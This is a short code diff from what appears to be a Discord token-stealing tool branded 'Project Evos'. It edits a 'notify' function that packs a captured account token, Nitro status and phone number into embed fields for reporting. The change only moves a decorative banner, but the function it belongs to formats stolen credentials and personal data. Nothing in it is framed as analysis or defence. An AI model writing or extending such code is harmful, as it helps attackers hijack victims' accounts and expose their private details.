@@ -263,7 +263,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.embeds[0].fields.unshift({
         name: `Token:`,
-        value: '```ansi\n' + `${boldpink}${token}`+ '\x1b[0m```',
+        value: '```ansi\n' + `${boldpink}${token}`+`\n\x1b[1;30m⊰⊹═════⊹⊱≼Project Evos≽⊰⊹═════⊹⊱`+ '\x1b[0m```' ,
         inline: false
     })
 
@@ -273,7 +273,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.embeds[0].fields.push(
         // { name: "\u200b", value: `\n\`\`\`${arrow}\`\`\``, inline: false },
-        {name: "-",value: '```ansi\n' +`\x1b[1;30m⊰⊹═════⊹⊱≼Project Evos≽⊰⊹═════⊹⊱`+'\x1b[0m```',inline: false},
+        // {name: "-",value: '```ansi\n' +`\x1b[1;30m⊰⊹═════⊹⊱≼Project Evos≽⊰⊹═════⊹⊱`+'\x1b[0m```',inline: false},
         { name: "Nitro", value: `\`${nitro}\``, inline: true },
         { name: "Phone", value: `\`${user.phone}\`` ? `\`${user.phone}\`` : 'x', inline: true },
         // { name: "\u200b", value: "\u200b", inline: false },
